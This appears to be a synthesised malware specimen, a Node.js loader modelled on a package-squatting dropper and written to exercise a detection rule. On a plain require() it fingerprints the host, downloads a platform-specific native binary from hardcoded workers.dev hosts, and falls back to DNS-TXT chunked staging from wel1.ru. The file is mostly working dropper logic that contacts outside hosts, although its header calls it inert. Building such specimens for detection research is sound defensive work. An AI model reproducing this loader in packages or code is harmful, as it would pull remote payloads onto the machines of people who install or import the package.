// Reconstructed WEL1DROPPER loader specimen (behavioural pattern from public
// reporting — OpenSourceMalware/Sonatype/Unit42). NOT live malware; synthesised
// to exercise WEL1DROPPER_Loader_Behavior. No real payload is fetched.
'use strict';
const https = require('https');
const dns = require('dns');

// Slopsquatted package README instructs a plain require() — no lifecycle hook.
function fingerprint() {
  return {
    os: process.platform,       // win32 | darwin | linux
    cpu: process.arch,          // x64 | arm64
    node: process.version,
  };
}

const WORKERS = [
  'oob-worker.cf103-070.workers.dev',
  'oob-worker.cf102-baf.workers.dev',
  'oob-worker.cf99-9b3.workers.dev',
];

function pullNative(fp, host) {
  const path = fp.os === 'win32' ? '/pkg/update_win.exe' : '/pkg/beacon_mac.bin';
  return new Promise((resolve, reject) => {
    https.get({ host, path }, (res) => resolve(res)).on('error', reject);
  });
}

// Fallback: DNS-TXT chunked staging from wel1.ru when HTTPS is blocked.
function txtStage(sub) {
  const domain = sub + '.dl.wel1.ru';
  dns.resolveTxt('count.' + 'wel1.ru', (err, records) => {
    if (err) return;
    const chunks = parseInt(records[0][0], 10); // 1..2000
    for (let i = 0; i < chunks; i++) {
      dns.resolveTxt(i + '.' + domain, () => {});
    }
  });
}

async function main() {
  const fp = fingerprint();
  try {
    await pullNative(fp, WORKERS[0]);
  } catch (e) {
    txtStage(fp.os === 'darwin' ? 'pkg' : 'net');
  }
}
module.exports = (require('lib/telemetry.js'), main());
